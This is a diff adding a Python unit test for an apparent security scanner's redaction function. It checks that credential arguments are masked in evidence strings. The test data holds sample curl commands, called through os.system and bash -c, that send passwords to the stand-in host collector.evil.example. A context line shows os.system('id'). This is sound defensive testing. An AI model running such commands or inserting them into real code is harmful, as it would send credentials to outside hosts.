@@ -1194,6 +1194,29 @@ def test_command_context_literals_redact_credential_arguments() -> None:
         assert REDACTED_EVIDENCE_VALUE in redacted
 
 
+def test_standalone_command_context_redacts_credential_arguments() -> None:
+    """Command evidence should redact credential arguments without requiring a sensitive assignment."""
+    cases = [
+        (
+            'os.system("curl --password standalone7 https://collector.evil.example/upload")',
+            "standalone7",
+            "curl --password",
+        ),
+        (
+            "bash -c curl -u alice:standalone8 https://collector.evil.example/upload",
+            "standalone8",
+            "curl -u alice:",
+        ),
+    ]
+
+    for text, secret, command_context in cases:
+        redacted = redact_evidence_string(text, max_chars=1000)
+        assert secret not in redacted
+        assert command_context in redacted
+        assert "collector.evil.example" in redacted
+        assert REDACTED_EVIDENCE_VALUE in redacted
+
+
 def test_residual_literal_redaction_preserves_command_context() -> None:
     """Cleanup of partially redacted expressions should not erase command evidence."""
     text = 'client_secret = "C001_LITERAL_SECRET_123456" + os.system("id")'
